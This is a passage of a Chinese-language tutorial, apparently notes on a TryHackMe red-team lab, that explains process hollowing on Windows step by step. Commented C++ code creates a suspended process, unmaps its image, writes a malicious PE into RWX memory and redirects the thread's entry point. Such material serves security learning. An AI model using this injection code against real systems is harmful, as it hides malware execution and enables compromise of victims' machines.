NULL 表示使用默认值</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 当前目录 NULL 表示使用默认值</span></span><span class="line"><span style="color: #ABB2BF">target_si,</span><span style="color: #7F848E; font-style: italic"> // 指向启动信息结构体的指针</span></span><span class="line"><span style="color: #ABB2BF">target_pi) </span><span style="color: #C678DD">==</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">) {</span><span style="color: #7F848E; font-style: italic"> // 指向进程信息结构体的指针</span></span><span class="line"><span style="color: #ABB2BF">cout </span><span style="color: #C678DD">&lt;&lt;</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;[!] Failed to create Target process. Last Error: &quot;</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">&lt;&lt;</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">GetLastError</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">;</span></span></code></pre></div></div></figure><h4 id="第二步：读取恶意镜像到本地内存"><a href="#第二步：读取恶意镜像到本地内存" class="headerlink" title="第二步：读取恶意镜像到本地内存"></a>第二步：读取恶意镜像到本地内存</h4><p>我们需要打开一个恶意镜像进行注入，首先使用 <code>CreateFileA</code> 获取恶意镜像的句柄。</p><ul><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea">CreateFileA function (fileapi.h) - Win32 apps</a></li></ul><figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 被打开文件的句柄</span></span><span class="line"><span style="color: #ABB2BF">HANDLE hMaliciousCode </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateFileA</span><span style="color: #ABB2BF">(</span></span><span class="line"><span style="color: #ABB2BF">(LPCSTR)</span><span style="color: #98C379">&quot;C:</span><span style="color: #56B6C2">\\\\</span><span style="color: #98C379">Users</span><span style="color: #56B6C2">\\\\</span><span style="color: #98C379">tryhackme</span><span style="color: #56B6C2">\\\\</span><span style="color: #98C379">malware.exe&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 要打开的文件的路径</span></span><span class="line"><span style="color: #ABB2BF">GENERIC_READ,</span><span style="color: #7F848E; font-style: italic"> // 只读访问</span></span><span class="line"><span style="color: #ABB2BF">FILE_SHARE_READ,</span><span style="color: #7F848E; font-style: italic"> // 只读共享模式，FILE_SHARE_READ 意味着其他进程也可以打开这个文件来读取，但不能写入</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 使用默认的安全设置</span></span><span class="line"><span style="color: #ABB2BF">OPEN_EXISTING,</span><span style="color: #7F848E; font-style: italic"> // 指示函数如果文件或设备存在就打开它</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 模板文件</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #D19A66">NULL</span><span style="color: #7F848E; font-style: italic"> // 文件属性</span></span><span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><p>一旦获得恶意镜像的句柄，就使用 <code>GetFileSize</code> 获取其大小，然后用 <code>VirtualAlloc</code> 为<strong>当前进程</strong>分配一个足够存储整个文件的内存块。</p><ul><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-getfilesize">GetFileSize function</a></li><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">VirtualAlloc function</a></li></ul><figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">DWORD maliciousFileSize </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">GetFileSize</span><span style="color: #ABB2BF">(</span></span><span class="line"><span style="color: #ABB2BF">hMaliciousCode,</span><span style="color: #7F848E; font-style: italic"> // 被打开文件的句柄</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #D19A66">0</span><span style="color: #7F848E; font-style: italic"> // 打开 4GB 以下文件</span></span><span class="line"><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">PVOID pMaliciousImage </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">VirtualAlloc</span><span style="color: #ABB2BF">(</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #ABB2BF">maliciousFileSize,</span><span style="color: #7F848E; font-style: italic"> // 文件大小</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">0x</span><span style="color: #D19A66">3000</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // Reserves and commits pages (MEM_RESERVE | MEM_COMMIT)</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">0x</span><span style="color: #D19A66">04</span><span style="color: #7F848E; font-style: italic"> // Enables read/write access (PAGE_READWRITE)</span></span><span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><p>现在内存已分配给本地进程，必须对其进行写入。利用从先前步骤中获得的信息，我们可以使用 <code>ReadFile</code> 将数据写入本地进程内存。</p><figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">DWORD numberOfBytesRead;</span><span style="color: #7F848E; font-style: italic"> // 存储读取的字节数</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">!</span><span style="color: #61AFEF">ReadFile</span><span style="color: #ABB2BF">(</span></span><span class="line"><span style="color: #ABB2BF">hMaliciousCode,</span><span style="color: #7F848E; font-style: italic"> // 被打开文件的句柄</span></span><span class="line"><span style="color: #ABB2BF">pMaliciousImage,</span><span style="color: #7F848E; font-style: italic"> // 分配好的内存区域</span></span><span class="line"><span style="color: #ABB2BF">maliciousFileSize,</span><span style="color: #7F848E; font-style: italic"> // 文件大小</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #56B6C2">&amp;</span><span style="color: #ABB2BF">numberOfBytesRead,</span><span style="color: #7F848E; font-style: italic"> // 读取的字节数</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #D19A66">NULL</span></span><span class="line"><span style="color: #ABB2BF">)) {</span></span><span class="line"><span style="color: #ABB2BF">cout </span><span style="color: #C678DD">&lt;&lt;</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;[!] Unable to read Malicious file into memory. Error: &quot;</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">&lt;&lt;</span><span style="color: #61AFEF">GetLastError</span><span style="color: #ABB2BF">()</span><span style="color: #C678DD">&lt;&lt;</span><span style="color: #ABB2BF"> endl;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #61AFEF">TerminateProcess</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">target_pi</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">hProcess</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"></span><span class="line"><span style="color: #61AFEF">CloseHandle</span><span style="color: #ABB2BF">(hMaliciousCode);</span></span></code></pre></div></div></figure><h4 id="第三步：掏空目标进程"><a href="#第三步：掏空目标进程" class="headerlink" title="第三步：掏空目标进程"></a>第三步：掏空目标进程</h4><p>我们需要“掏空”目标进程的内存，我们必须找到进程的基址和入口点。</p><p>为了找到这些信息，我们首先要获取主线程的<strong>上下文（Context）</strong>。在 32 位系统上，<code>GetThreadContext</code> 函数能让我们访问线程暂停时的所有寄存器状态。<strong>在线程创建并挂起后</strong>，<code>EBX</code> 寄存器会指向进程环境块（PEB），而 <code>EAX</code> 则包含了原始程序的<strong>入口点</strong></p><p>一旦获取了 <code>EBX</code> 的值，我们使用 <code>ReadProcessMemory</code> 函数，从 <code>EBX</code> 指向的地址加上 <code>0x8</code>（对于 32 位系统）或 <code>0x10</code>（对于 64 位系统）的固定偏移量来读取进程的<strong>原始镜像基址</strong>。</p><ul><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory">ReadProcessMemory function (memoryapi.h) - Win32 apps</a></li></ul><figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 只在指针中存储 CPU 寄存器</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// CONTEXT_INTEGER 是一个标志，它告诉 GetThreadContext 函数，你只关心线程的整数寄存器（如 Eax、Ebx 等），而不需要浮点寄存器或其他信息。这能减少开销，并获得你所需的数据。</span></span><span class="line"><span style="color: #E5C07B">c</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">ContextFlags</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> CONTEXT_INTEGER; </span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// 获取当前线程上下文</span></span><span class="line"><span style="color: #61AFEF">GetThreadContext</span><span style="color: #ABB2BF">(</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">target_pi</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">hThread</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 从 PROCESS_INFORMATION 结构体中获取 线程 句柄</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #56B6C2">&amp;</span><span style="color: #ABB2BF">c</span><span style="color: #7F848E; font-style: italic"> // GetThreadContext 函数会将该线程的当前寄存器状态写入这个结构体</span></span><span class="line"><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// 存储从目标进程读取的基址</span></span><span class="line"><span style="color: #ABB2BF">PVOID pTargetImageBaseAddress; </span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// 读取进程内存</span></span><span class="line"><span style="color: #61AFEF">ReadProcessMemory</span><span style="color: #ABB2BF">(</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">target_pi</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">hProcess</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 从 PROCESS_INFORMATION 结构体中获取 进程 句柄</span></span><span class="line"><span style="color: #ABB2BF">(PVOID)(</span><span style="color: #E5C07B">c</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">Ebx</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">8</span><span style="color: #ABB2BF">),</span><span style="color: #7F848E; font-style: italic"> // 进程的基址</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #56B6C2">&amp;</span><span style="color: #ABB2BF">pTargetImageBaseAddress,</span><span style="color: #7F848E; font-style: italic"> // 存储基址到这个变量 </span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">sizeof</span><span style="color: #ABB2BF">(PVOID),</span><span style="color: #7F848E; font-style: italic"> // 要读取的字节数</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #D19A66">0</span><span style="color: #7F848E; font-style: italic"> // 读取的字节数，这里用 NULL 代替，表示不关心</span></span><span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><p>获取进程的基址后，我们就可以开始取消映射内存了。我们可以从 ntdll.dll 导入 <code>ZwUnmapViewOfSection</code> API 来释放目标进程的内存。</p><figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">HMODULE hNtdllBase </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">GetModuleHandleA</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;ntdll.dll&quot;</span><span style="color: #ABB2BF">);</span><span style="color: #7F848E; font-style: italic"> // 获取 ntdll 的句柄</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// 从 ntdll 里面获取 ZwUnmapViewOfSection API</span></span><span class="line"><span style="color: #ABB2BF">pfnZwUnmapViewOfSection pZwUnmapViewOfSection </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (pfnZwUnmapViewOfSection)</span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(</span></span><span class="line"><span style="color: #ABB2BF">hNtdllBase,</span><span style="color: #7F848E; font-style: italic"> // ntdll 的句柄</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #98C379">&quot;ZwUnmapViewOfSection&quot;</span><span style="color: #7F848E; font-style: italic"> // 要获取的 API 函数</span></span><span class="line"><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// 存储执行 ZwUnmapViewOfSection 的结果，也就是掏空成功与否</span></span><span class="line"><span style="color: #ABB2BF">DWORD dwResult </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">pZwUnmapViewOfSection</span><span style="color: #ABB2BF">(</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">target_pi</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">hProcess</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 从 PROCESS_INFORMATION 结构体中获取 进程 句柄</span></span><span class="line"><span style="color: #ABB2BF">pTargetImageBaseAddress</span><span style="color: #7F848E; font-style: italic"> // 要掏空的进程的基址</span></span><span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><h4 id="第四步：重新分配并写入恶意代码"><a href="#第四步：重新分配并写入恶意代码" class="headerlink" title="第四步：重新分配并写入恶意代码"></a>第四步：重新分配并写入恶意代码</h4><p>第四步，我们需要在目标进程中重新分配内存，但这回分配的大小不是原文件的大小，而是<strong>恶意代码镜像在内存中所需的大小</strong>。</p><p>为了获取这个精确的尺寸，我们必须解析恶意可执行文件（PE 文件）的头部。</p><ol><li>首先，通过 <code>e_lfanew</code> 字段，我们可以找到从 <strong>DOS 头部</strong>到 <strong>PE 头部</strong>的字节偏移量。</li><li>接着，一旦定位到 PE 头部，我们就可以从<strong>可选头部</strong>中读取 <code>SizeOfImage</code> 字段。</li></ol><p>过程简述：获取 DOS 头部 -&gt; 从 DOS 头部中获取 e_lfanew -&gt; 定位到 NT 头部 -&gt; NT 头部中找到可选头部 -&gt; 找到 SizeOfImage</p><figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 从恶意镜像中获取 DOS 头部</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 将 pMaliciousImage 强制类型转换为 PIMAGE_DOS_HEADER</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 使其能作为指针来访问 PE 文件的 DOS 头部</span></span><span class="line"><span style="color: #ABB2BF">PIMAGE_DOS_HEADER pDOSHeader </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (PIMAGE_DOS_HEADER)pMaliciousImage;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// PE 文件的核心是 NT 头部，e_lfanew 存储了从文件开头到 NT 头部起始位置的偏移量，而 e_lfanew 是在 DOS 头部中的</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 这里利用这个偏移量，计算出 NT 头部在内存中的确切位置</span></span><span class="line"><span style="color: #ABB2BF">PIMAGE_NT_HEADERS pNTHeaders </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (PIMAGE_NT_HEADERS)((LPBYTE)pMaliciousImage </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">pDOSHeader</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">e_lfanew</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// 从 NT 头部结构体中获取可选头部的大小</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// SizeOfImage 定义了可执行文件加载到内存所需的总大小</span></span><span class="line"><span style="color: #ABB2BF">DWORD sizeOfMaliciousImage </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">pNTHeaders</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E5C07B">OptionalHeader</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">SizeOfImage</span><span style="color: #ABB2BF">; </span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// 在目标进程中分配内存</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 返回的是分配好的内存的指针地址</span></span><span class="line"><span style="color: #ABB2BF">PVOID pHollowAddress </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">VirtualAllocEx</span><span style="color: #ABB2BF">(</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">target_pi</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">hProcess</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 目标进程的句柄，从结构体里面拿的</span></span><span class="line"><span style="color: #ABB2BF">pTargetImageBaseAddress,</span><span style="color: #7F848E; font-style: italic"> // 进程的基址</span></span><span class="line"><span style="color: #ABB2BF">sizeOfMaliciousImage,</span><span style="color: #7F848E; font-style: italic"> // 加载到内存所需的总大小</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">0x</span><span style="color: #D19A66">3000</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // Reserves and commits pages (MEM_RESERVE | MEM_COMMIT)</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">0x</span><span style="color: #D19A66">40</span><span style="color: #7F848E; font-style: italic"> // Enabled execute and read/write access (PAGE_EXECUTE_READWRITE)</span></span><span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><p>分配好内存后，我们就可以将<strong>恶意文件的内存镜像</strong>写入目标进程。由于 PE 文件的内存镜像结构，我们必须先将 <strong>PE 头部</strong>写入新分配的内存空间。在写入 PE 头部时，我们使用 <code>WriteProcessMemory</code> 函数，并指定 PE 头部的大小来确定写入范围。</p><figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">!</span><span style="color: #61AFEF">WriteProcessMemory</span><span style="color: #ABB2BF">(</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">target_pi</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">hProcess</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 进程句柄</span></span><span class="line"><span style="color: #ABB2BF">pTargetImageBaseAddress,</span><span style="color: #7F848E; font-style: italic"> // 进程基址</span></span><span class="line"><span style="color: #ABB2BF">pMaliciousImage,</span><span style="color: #7F848E; font-style: italic"> // 内存中恶意镜像文件的地址</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">pNTHeaders</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E5C07B">OptionalHeader</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">SizeOfHeaders</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // PE 头的大小</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #D19A66">NULL</span></span><span class="line"><span style="color: #ABB2BF">)) {</span></span><span class="line"><span style="color: #ABB2BF">cout</span><span style="color: #C678DD">&lt;&lt;</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;[!] Writting Headers failed. Error: &quot;</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">&lt;&lt;</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">GetLastError</span><span style="color: #ABB2BF">() </span><span style="color: #C678DD">&lt;&lt;</span><span style="color: #ABB2BF"> endl;</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p>现在我们需要写入每个节。要查找节的数量，我们可以使用 NT 头中的 <code>NumberOfSections</code> 。我们可以通过循环遍历 <code>e_lfanew</code> 和当前头的大小来写入每个节。</p><img src="/thm_rthe/a2e6d40803c1d01beedd6e821de2e8d6.png" class="" title="img"><figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 根据 PE 中的分段数进行循环</span></span><span class="line"><span style="color: #C678DD">for</span><span style="color: #ABB2BF"> (</span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> i </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">; i </span><span style="color: #C678DD">&lt;</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">pNTHeaders</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E5C07B">FileHeader</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">NumberOfSections</span><span style="color: #ABB2BF">; i</span><span style="color: #C678DD">++</span><span style="color: #ABB2BF">) { </span></span><span class="line"><span style="color: #7F848E; font-style: italic">    // 确定当前的 PE 节头部 强制转换成 PIMAGE_SECTION_HEADER 结构体</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    // 计算出当前节的头部在恶意文件内存中的精确位置</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    // DOS 头到 NT 头部的偏移量 + NT 头本身的大小 + 节数 * 节头部的大小 = 要写入的节头部地址</span></span><span class="line"><span style="color: #ABB2BF">PIMAGE_SECTION_HEADER pSectionHeader </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (PIMAGE_SECTION_HEADER)((LPBYTE)pMaliciousImage </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">pDOSHeader</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">e_lfanew</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">sizeof</span><span style="color: #ABB2BF">(IMAGE_NT_HEADERS) </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> (i </span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">sizeof</span><span style="color: #ABB2BF">(IMAGE_SECTION_HEADER))); </span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #61AFEF">WriteProcessMemory</span><span style="color: #ABB2BF">(</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">target_pi</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">hProcess</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 进程句柄</span></span><span class="line"><span style="color: #ABB2BF">(PVOID)((LPBYTE)pHollowAddress </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">pSectionHeader</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">VirtualAddress</span><span style="color: #ABB2BF">),</span><span style="color: #7F848E; font-style: italic"> // 要写入的目标地址 当前节在内存中的相对地址，这是在节里面定义好的</span></span><span class="line"><span style="color: #ABB2BF">(PVOID)((LPBYTE)pMaliciousImage </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">pSectionHeader</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">PointerToRawData</span><span style="color: #ABB2BF">),</span><span style="color: #7F848E; font-style: italic"> // 源地址 当前节在文件中的偏移量 镜像基址 + 当前节数据的偏移量 = 节开始的地址</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">pSectionHeader</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">SizeOfRawData</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 当前节的原始数据大小</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #D19A66">NULL</span><span style="color: #7F848E; font-style: italic"> // 写入了多少字节</span></span><span class="line"><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><h4 id="第五步：修改上下文并恢复线程"><a href="#第五步：修改上下文并恢复线程" class="headerlink" title="第五步：修改上下文并恢复线程"></a>第五步：修改上下文并恢复线程</h4><p>我们使用 <code>SetThreadContext</code> 将 <code>EAX</code> 更改为指向入口点，最后使用 <code>ResumeThread</code> 将进程从挂起状态中恢复。</p><figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 将挂起线程的 EAX 寄存器修改为恶意镜像的入口点地址。当线程恢复时，它将从这个新的地址开始执行。</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 这里的 c 是上下文结构体</span></span><span class="line"><span style="color: #E5C07B">c</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">Eax</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (SIZE_T)((LPBYTE)pHollowAddress </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">pNTHeaders</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E5C07B">OptionalHeader</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">AddressOfEntryPoint</span><span style="color: #ABB2BF">); </span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// 修改线程的上下文</span></span><span class="line"><span style="color: #61AFEF">SetThreadContext</span><span style="color: #ABB2BF">(</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">target_pi</span><span style="color: #ABB2BF">-&gt;</span><span style="color: 